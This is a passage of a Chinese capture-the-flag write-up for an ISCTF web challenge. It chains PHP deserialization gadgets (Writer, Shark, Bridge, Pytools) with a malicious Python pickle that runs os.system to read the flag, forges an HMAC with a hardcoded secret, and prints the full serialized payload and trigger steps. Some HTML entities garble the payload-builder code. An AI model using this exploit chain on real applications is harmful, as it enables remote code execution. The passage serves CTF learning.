        $this->b64data = $b64data;
    }

    public function __wakeup() {
        $this->{$this->init}();
    }

    private function init() {
        $dir = dirname($this->binfile);
        if (!is_dir($dir)) {
            @mkdir($dir, 0700, true);
        }
    }

    private function write_all() {
        if ($this->b64data === "") {
            return;
        }

        $raw = base64_decode($this->b64data);
        if ($raw === false) {
            return;
        }

        @file_put_contents($this->binfile, $raw);  //写入文件

        $sig = hash_hmac("sha256", $raw, $this->secret);  //这里会使用$secret生成合法签名
        $meta = json_encode([
            "sig" => $sig,
            "ts"  => time(),
        ]);
        @file_put_contents($this->metafile, $meta);
    }

    public function fetch() {
        $this->write_all();
        return "喵喵喵!";
    }
}

```

在write类里面有特定的签名$secret = "kaqikaqi";，我们可以给上面python构造与php相同的签名，里面要求了用base64传输

然后我们再看看Shark类

```php
#classes.php
class Shark {
    public $ser = "";

    public function __construct($s="") {
        $this->ser = $s;
    }

    public function __toString() {
        $this->apply();
        return "喵喵喵!";
    }

    private function apply() {
        if ($this->ser === "") {
            return;
        }

        $file = "/tmp/ssxl/run.bin";
        @file_put_contents($file, $this->ser);
    }

    public function fetch() {
        return "喵喵喵!";
    }
}
```

这里把数据写入了run.bin

再接着看到Bridge类

```php
#classes.php
class Bridge {
    public $writer;   
    public $shark;

    public function __construct($w, $s) {
        if (!($w instanceof Writer) || !($s instanceof Shark)) {
            echo "喵喵喵?";
            exit(1);
        }
        // 访问不存在的属性 $this->write
        // 触发__get(）
        $this->writer = $w;
        $this->shark = $s;
    }

    public function __get($name) {
        if ($name === "write") {
            if (!($this->writer instanceof Writer)){
                return "喵喵喵?";
            }
            // 这里的 writer 是 Writer 对象
            // 调用 Writer->fetch() -> write_all() 
            // 这一步生成了 write.bin和 write.meta
            $this->writer->fetch();
            return $this->shark;
        }
    }

    public function __isset($name) {
        if ($name === "write") {
            return
                ($this->writer instanceof Writer) &&
                ($this->shark instanceof Shark);
        }
        return false;
    }

    public function __set($name, $value) {
        if ($name === "write") {
            $this->writer = $value;
        }
        else if ($name === "shark") {
            $this->shark = $value;
        }
    }

    public function __unset($name) {
        if ($name === "write") {
            $this->writer = null;
        }
        else if ($name === "shark") {
            $this->shark = null;
        }
    }

    public function fetch() {
        $next = $this->write;
        if ($next instanceof Shark) {
            return $next;
        }
        return "喵喵喵!";
    }
}
```

看看Pytools

```php
// classes.php
class Pytools extends Cat {
    // ...
    
    //执行 Python 脚本
    public function run() {
        $cmd = "python3 /var/www/html/pytools.py";
        $out = @shell_exec($cmd . " 2>&1");
        // ...
        return $out;
    }

    //当调用不存在的方法时触发
    public function __call($name, $args) {
        //run.php 调用 $exec->blueshark()，就会跳到这里
        return $this->run(); 
    }
}
```

整理一下

最后的利用是在python里面的RCE，签名校验我们可以用"kaqikaqi"

前一步的话是Writer和Shark来生成write.bin文件和run.bin文件以及添加签名"kaqikaqi"

最外面就是Bridge,利用Bridge为入口，将Writer和Shark串起来

构造payload

```py
import pickle
import os
import base64

class Set:
    def __init__(self, secret, payload):
        self.secret = secret
        self.payload = payload

class RCE:
    def __reduce__(self):
        cmd = "cat /flag > /tmp/ssxl/outs.txt"
        return (os.system, (cmd,))

def generate():
    inner_payload = pickle.dumps(RCE())
    
    # secret设为"kaqikaqi"，因为 PHP 的 Writer 类默认使用这个密钥签名
    obj = Set(b"kaqikaqi", inner_payload)
    # 在 Linux 下运行，这里生成的会是 posix.system
    final_pickle = pickle.dumps(obj)
    b64_pickle = base64.b64encode(final_pickle).decode()
    # Pytools 对象：用于 run.php 触发 Python
    s_pytools = 'O:7:"Pytools":0:{}'
    # Shark 对象：负责把 Pytools 写入 run.bin
    s_shark = f'O:5:"Shark":1:&#123;&#123;s:3:"ser";s:{len(s_pytools)}:"{s_pytools}";&#125;&#125;'
    # Writer 对象：负责把我们的 pickle 写入 write.bin
    # 注意：init 必须传 "init" 字符串，绕过 __wakeup 的逻辑，确保目录被创建
    s_writer = f'O:6:"Writer":2:&#123;&#123;s:7:"b64data";s:{len(b64_pickle)}:"{b64_pickle}";s:4:"init";s:4:"init";&#125;&#125;'
    # Bridge 对象：POP 链入口
    s_bridge = f'O:6:"Bridge":2:&#123;&#123;s:6:"writer";{s_writer}s:5:"shark";{s_shark&#125;&#125;}'
    # 加上index.php要求的前缀
    final_payload = "blueshark:" + s_bridge
    print(final_payload)

if __name__ == "__main__":
    generate()

#blueshark:O:6:"Bridge":2:{s:6:"writer";O:6:"Writer":2:{s:7:"b64data";s:188:"gASVgQAAAAAAAACMCF9fbWFpbl9flIwDU2V0lJOUKYGUfZQojAZzZWNyZXSUQwhrYXFpa2FxaZSMB3BheWxvYWSUQ0SABJU5AAAAAAAAAIwFcG9zaXiUjAZzeXN0ZW2Uk5SMHmNhdCAvZmxhZyA+IC90bXAvc3N4bC9vdXRzLnR4dJSFlFKULpR1Yi4=";s:4:"init";s:4:"init";}s:5:"shark";O:5:"Shark":1:{s:3:"ser";s:18:"O:7:"Pytools":0:{}";&#125;&#125;
```

需要在Linux环境跑，因为

在 Windows 上：os 模块实际上是指向 nt 模块的。当你序列化 os.system 时，Python 记录的路径是 nt.system

在 Linux 上：os 模块指向的是 posix 模块。序列化时记录的是 posix.system

当把把在 Windows 上生成的 Payload 发给 Linux 服务器时，它会报 **​`ModuleNotFoundError: No module named 'nt'`​** 

有payload了，我们操作就行

先在留言板把payload传上去

![07a44d0d-c68a-4fc9-a667-bd1d1161d2ed](/img/ISCTF-web部分/07a44d0d-c68a-4fc9-a667-bd1d1161d2ed-20251219165236-lv6s16n.png)

然后访问api.php?id=对应的数，这一步触发了 PHP 反序列化，Bridge 开始工作，在服务器生成攻击所需的 .bin 文件，页面显示 喵喵喵!说明写入成功

![1b19881a-08a2-415e-8fdf-13b2429264fc](/img/ISCTF-web部分/1b19881a-08a2-415e-8fdf-13b2429264fc-20251219165432-dd4uovk.png)

点击页面上的  **"喵喵喵" 按钮**（或者访问 run.php?action\=run，这里是PHP 调用 Python 脚本，Python 脚本加载恶意文件并执行命令。

![88e681c7-e4b6-4faa-8b02-92ca2d89db12](/img/ISCTF-web部分/88e681c7-e4b6-4faa-8b02-92ca2d89db12-20251219165521-jl8dzq1.png)

## 总结一下

怎么说呢，就只写了解多的，说实话自己还是有点太依赖ai了，这个习惯得改，狠狠的改，继续加油吧，诶~

‍